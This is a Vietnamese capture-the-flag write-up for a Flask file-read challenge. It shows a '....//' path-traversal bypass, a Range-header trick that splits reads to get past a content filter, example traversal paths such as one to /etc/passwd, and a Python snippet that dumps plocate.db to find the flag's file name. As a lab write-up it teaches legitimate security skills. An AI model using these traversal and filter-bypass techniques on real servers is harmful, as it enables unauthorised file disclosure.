# Another Baby Web — Writeup đầy đủ (kể cả những chỗ sai)

> **Flag:** `ASIS{Baby_w3b_cha!!3nGe_$$$}`
> **Thứ tự giải thực tế:** traversal (5 phút) → range bypass (10 phút) → **mắc kẹt 2 ngày** ở "tìm tên file" → giải nhờ gợi ý `plocate`.
> Bài học lớn nhất không nằm ở bug — mà ở chỗ tôi đã vứt bỏ manh mối quan trọng nhất ngay từ phút đầu tiên.

---

## 0. Đề bài

Flask app đọc file theo query param `path`, có 3 lớp phòng thủ:

```python
FORBIDDEN_PREFIXES = ("/etc", "/dev", "/proc", "/entrypoint.sh")
MAX_PATH_LEN = 110

def resolve(user_path):
    ...
    cleaned = user_path.replace("../", "")            # ← bug 1
    resolved = os.path.normpath("/app" + cleaned)
    if is_forbidden(resolved): return None
    return resolved

def bad_data(data: bytes) -> bool:
    BLOCKED = (bytes([65,83,73,83]), bytes([108,105,98]))   # b"ASIS", b"lib"
    return any(marker in data for marker in BLOCKED)

@app.route("/inspect")
def inspect_file():
    ...
    response = send_file(resolved, conditional=True)  # ← bug 2
    response.direct_passthrough = False
    body = response.get_data()
    if bad_data(body): return jsonify(GENERIC_ERROR), 400
```

---

## 1. Việc làm đúng đầu tiên: fuzz trả lời "file nào tồn tại?"

Ngay khi `/flag.txt` và `/....//flag.txt` đều trả về generic error, tôi không kết luận vội.
Error message không phân biệt *"không tồn tại"* và *"tồn tại nhưng dính filter"*. Thay vào đó tôi biến endpoint thành **existence oracle**:

> `Range: bytes=0-2` → server chỉ filter đúng 3 byte đó → nếu 3 byte này vô hại thì **200 = file tồn tại, 400 = không tồn tại** (không mơ hồ).

Điều này đúng như thiết kế và đã được kiểm chứng. Nhưng có một chi tiết tinh tế mà tôi **không nhận ra suốt 2 ngày** (xem §3).

---

## 2. Hai bug — cả hai đều khai thác được ngay

### Bug 1 — Path traversal: `replace()` chỉ quét một lượt

```python
cleaned = user_path.replace("../", "")
```

`str.replace` thay thế trái→phải **một lượt, không quét lại chuỗi kết quả**. Nên lồng chuỗi là bypass:

```
"....//"  --replace("../","")-->  "../"     ← tái sinh!
```

Kiểm chứng bằng Python thuần: `"....//".replace("../", "")` → `'../'`.

```
/....//flag.txt                 → /flag.txt
/....//var/lib/plocate/plocate.db → /var/lib/plocate/plocate.db
/....//....//etc/passwd         → /etc/passwd    (nhưng /etc bị chặn ở resolve())
```

### Bug 2 — Filter nội dung, nhưng client chọn byte: `Range`

```python
response = send_file(resolved, conditional=True)
response.direct_passthrough = False
body = response.get_data()
if bad_data(body): ...
```

`conditional=True` khiến Werkzeug xử lý header `Range: bytes=a-b` **trước** khi `get_data()` chạy.
Filter chỉ nhìn thấy cửa sổ byte mà mình chọn:

| Range | Nội dung thấy | Kết quả |
|---|---|---|
| (không) | `ASIS{...}` | ❌ 400 |
| `bytes=0-1` | `AS` | ✅ 200 |
| `bytes=2-3` | `IS` | ✅ 200 |

Marker ngắn nhất là `lib` (3 byte) ⇒ **cửa sổ 2 byte không bao giờ chứa marker** ⇒ ghép các cửa sổ nối tiếp = đọc nguyên file.

---

## 3. Tôi sai ở đâu — thời gian chi tiết

### Sai lầm #1 (nguyên nhân gốc, nghiêm trọng nhất): không đọc kỹ blacklist

`FORBIDDEN_PREFIXES = ("/etc", "/dev", "/proc", "/entrypoint.sh")` — ba mục đầu là **thư mục hệ thống**, mục thứ tư là **một file đơn lẻ**. Sự bất đối xứng này là tín hiệu dị thường rõ ràng nhất đề bài — tôi có замече nó, ghi chú "đáng chú ý", rồi … đi fuzz.

Worse: `bad_data` chặn `lib`. **Path nào chứa `lib`?** `/var/lib/` — kho dữ liệu hệ thống, nơi chứa `plocate.db` (index toàn bộ tên file), `dpkg` (danh sách file của mọi package), `git`… Việc chặn một chuỗi 3 byte vô hại như `lib` chỉ hợp lý nếu tác giả muốn chặn **đường dẫn thư mục** — và tôi đã tự trả lời câu hỏi đó trong một câu suy nghĩ rồi bỏ qua.

> **Bài học:** blacklist không chỉ là thứ cần bypass — nó còn là **bản đồ tư duy của người ra đề**. Mỗi mục là một câu trả lời cho "người ta từng bị exploiting bằng gì?". Tôi đã dùng nó để bypass thay vì để đọc ý đồ.

### Sai lầm #2: mất ~1 giờ vì một "improvement" sai

Thấy cần biết kích thước file, tôi thêm đọc `Content-Range` từ response. Nhưng response là `jsonify({...})` — **không hề có header `Content-Range`**. Đoạn code lấy `cr.split("/")[1]` âm thầm fallback `len(data)` = độ dài cửa sổ (2), rồi in ra "file size: 2".

Tôi tin con số đó vài chục phút, cho đến khi đối chiếu nội dung file mới phát hiện. Con số không tự验收: nó cần được so với nguồn khác, nếu không sẽ đầu độc mọi suy luận phía sau.

### Sai lầm #3: oracle có lỗ hổng lý thuyết — không phát hiện suốt 2 ngày

Cửa sổ oracle `bytes=0-2` dài **3 byte** — đúng bằng marker `lib` (3 byte). Nếu 3 byte đầu của một file tình cờ là `lib` (file `.so` của thư viện?), oracle trả 400 → tôi kết luận "không tồn tại" → **false negative**.

Cửa sổ an toàn tuyệt đối phải ≤ 2 byte: `bytes=0-1`. Tôi đã viết solver với cửa sổ 2 byte đúng ở phần đọc, nhưng dùng cửa sổ 3 byte ở phần dò — thiếu nhất quán, và không ai review để bắt lỗi đó.

### Sai lầm #4: chiến lược "brute-force khi thiếu thông tin"

Khi không tìm thấy file khả nghi, tôi leo thang fuzz: 48 → 158 → 459 → 1.710 → 17.796 → **93.717 candidate** qua 35+ thư mục. Mỗi lần âm số lớn hơn, mỗi lần càng chắc "đã quét đủ".

Đó là chiến lược **tối ưu sai chiều**: tôi đang đoán không gian tên file (vô hạn, và theo đề thì thực sự không đoán được — tên là hex ngẫu nhiên `1b00042fbee1f27c843a86626391b06e`), trong khi trên filesystem có sẵn một **index toàn bộ đường dẫn** (`plocate.db`) — chỉ cần đọc nó. Sức mạnh của file-read không nằm ở đọc file tôi biết tên, mà ở đọc **metadata giúp tôi biết tên**.

> Câu hỏi đúng phải là: *"trên Linux, file nào liệt kê được mọi file khác?"* — `/var/lib/plocate/plocate.db`, `/var/lib/dpkg/info/*.list`, `/proc/self/environ`, `/proc/self/maps`… Tôi đã chỉ nghĩ `/proc` (bị chặn) rồi dừng.

### Sai lầm #5: không dùng siêu mẫu có sẵn

Suốt quá trình giải, tôi chạy ~114k HTTP request tuần tự theo batch trong các script Python throwaway. Đáng lẽ phải dừng lại sau lần fuzz đầu tiên, nhận ra "thiếu thông tin về không gian tìm kiếm", và chuyển sang chiến lược khác. Việc lặp lại một hành động không hiệu quả với quy mô lớn hơn là dấu hiệu của việc **đang giải sai bài**, không phải đang giải chăm hơn.

---

## 4. Stuck điểm chính — và vì sao đúng chỗ đó

Stuck kéo dài duy nhất: **"tôi đọc được mọi file, nhưng không biết phải đọc file nào."**

Đây là stuck có tính nguyên lý, không phải sơ hở:

1. Không có directory listing (route `/` chỉ in source; `os.path.isdir` → error).
2. Tên flag là hex ngẫu nhiên — entropy ~2^128, đoán không thể.
3. Mọi nguồn metadata tên file quen thuộc đều bị chặn: `/proc/*` (blacklist), `/etc/*` (blacklist).

Bài được thiết kế để người giải chặn ở đúng lớp thứ ba này. Lối ra (như gợi ý của bạn) là một nguồn metadata **không quen thuộc**: `/var/lib/plocate/plocate.db`.

---

## 4b. Dead-ends đã kiểm chứng (không phải đoán)

| Hướng | Kết quả | Ghi chú |
|---|---|---|
| `/etc`, `/dev`, `/proc`, `/entrypoint.sh` | chặn ở `resolve()` | theo *pathname*, không theo inode — symlink-dir không giúp |
| `/static/*` (Flask static route mặc định) | 404 | thư mục không tồn tại |
| Werkzeug debug `/console` | 404 | debug tắt |
| Multipart Range `bytes=0-1,4-5` | 400 | Werkzeug từ chối nhiều range ở chế độ này |
| `normpath` giữ `//` đầu (`//proc`) | vô dụng | path luôn ghép từ `/app` + suffix; sau `..` tối đa về `/`, không tạo được `//` |
| `mlocate.db` | không tồn tại | chỉ `plocate.db` |
| Alternate proc mounts `/host/proc/...` | không tồn tại | |
| Symlink-dir hunting (`X/entrypoint.sh`) | 0 hit | không có symlink thoát blacklist |
| `__pycache__` của app | không tồn tại | |
| Git/docker metadata (`.git`, `Dockerfile`, `.env`…) | 0 hit | |
| `bytes=-8` suffix range | hoạt động | chỉ là cách đọc khác cùng file |
| Fuzz tên file tổng cộng | **~114.000 candidate, 0 flag** | tổ hợp 35+ thư mục × bộ từ vựng troll/CTF/src |

---

## 5. Hướng giải đúng (chuỗi 3 lớp)

```
....//                (thoát /app)
   ↓
/....//var/lib/plocate/plocate.db          (file index toàn bộ filesystem)
   ↓ Range adaptive
dump 334 KB trong ~45 giây
   ↓ decode bằng plocate thật trong Docker
plocate -d plocate.db -l 2000000 -i flag
   ↓
/app/1b00042fbee1f27c843a86626391b06e/flag.txt
   ↓ đọc bằng cửa sổ 2 byte
ASIS{Baby_w3b_cha!!3nGe_$$$}
```

### Lớp 3a — Dump plocate.db (adaptive bisect)

Đọc 2-byte từng bước cho file 334 KB cần ~167k request — quá chậm. Nhận xét xác suất: dữ liệu binary gần như ngẫu nhiên, xác suất một chunk 8 KB chứa đúng `lib` ≈ 1/16M per chuỗi, gần như không bao giờ. Chỉ vùng text chứa path mới nguy hiểm.

```python
def get(a, b):                          # doc window [a,b]
    req.add_header("Range", f"bytes={a}-{b}")
    ...                                  # 200 => du lieu; 400 => bi chan hoac EOF

def filesize():                          # binary search byte cuoi doc duoc
    lo, hi = 0, 1
    while get(hi, hi) is not None: lo, hi = hi, hi * 2
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        if get(mid, mid) is not None: lo = mid    # window 1 byte: an toan tuyet doi
        else: hi = mid
    return hi

# download: chunk 8KB song song; chunk bi chan -> xeo doi de quy
```

Window 1 byte dùng cho binary search size là an toàn tuyệt đối (marker ngắn nhất 3 byte).

### Lớp 3b — Decode plocate.db

plocate lưu trữ dạng **block-compressed trigram buckets** — strings-scan thô chỉ thấy mảnh vụn (`/uss/pip/...`, `/usist-packages/...`), không tái tạo được tên file. Phải dùng binary `plocate` thật:

```bash
docker run --rm -v "$PWD:/data" ubuntu:24.04 bash -c "
  apt-get update -qq && apt-get install -y -qq plocate
  plocate -d /data/plocate.db -l 2000000 -i flag
"
```

Vào lúc này, flag nằm **trong** `/app` — không cần traversal, chỉ cần biết tên. Đó chính là "trò" của bài: bug dễ thấy, filter dễ bypass, nhưng *tìm được file* mới là cửa thật.

### Xác minh

- Đọc độc lập lần 2, lệch pha từ byte 1: `SIS{Baby_w3b_cha!!3nGe_$$$}` — khớp.
- Oracle xác nhận `/app/1b00042fbee1f27c843a86626391b06e/301.txt` và `flag.txt` tồn tại.

---

## 6. Bài học (theo thứ tự quan trọng)

1. **Đọc blacklist như đọc tâm trí người ra đề.** `/entrypoint.sh` bị chặn riêng giữa ba thư mục hệ thống = "flag từng/gắn với entrypoint". `lib` bị chặn giữa hai marker format-flag = "path chứa `lib` là mối đe dọa". Tôi đã có cả hai câu trả lời trong tay ngay ngày đầu và vẫn đi fuzz.
2. **File-read mạnh ở chỗ đọc metadata, không phải đọc nội dung.** Khi không biết phải đọc gì, câu hỏi đúng là "file nào trên hệ thống này liệt kê được những file khác?" — index, package list, log, history.
3. **Một con số không được kiểm chứng sẽ đầu độc toàn bộ suy luận phía sau.** "file size: 2" lấy từ header không tồn tại đã khiến tôi tin file mồi chỉ có 2 byte.
4. **Brute-force leo thang là dấu hiệu đang giải sai bài.** Không gian tên file vô hạn và (theo thiết kế) không đoán được; đúng chỗ cần chuyển từ "đoán nội dung" sang "tìm nguồn metadata".
5. **Nhất quán window an toàn.** Oracle dùng window 3 byte (bằng đúng marker `lib` → false-negative lý thuyết); reader dùng 2 byte. Một mô hình an toàn, hai cách dùng.
6. **Verify chéo mọi kết quả trung gian.** Đối chiếu source deploy với bản paste, đọc lại flag lệch pha, so size dump với con số binary-search — mỗi lần verify đã bắt được (hoặc phòng được) một lỗi.

## 7. Artifacts

| File | Vai trò |
|---|---|
| `solve.py` | file-read tổng quát (traversal + range window 2-byte) |
| `plocate_dump.py` | dumper adaptive (binary-search size + bisect chunk), dùng cho file lớn |
| `/tmp/ploc/plocate.db` | DB đã dump (333.914 byte) |
| `/tmp/ploc/all_paths.txt` | 9.178 path đã decode |

Và memory `plocate-db-file-discovery` đã ghi lại kỹ thuật để tái sử dụng.
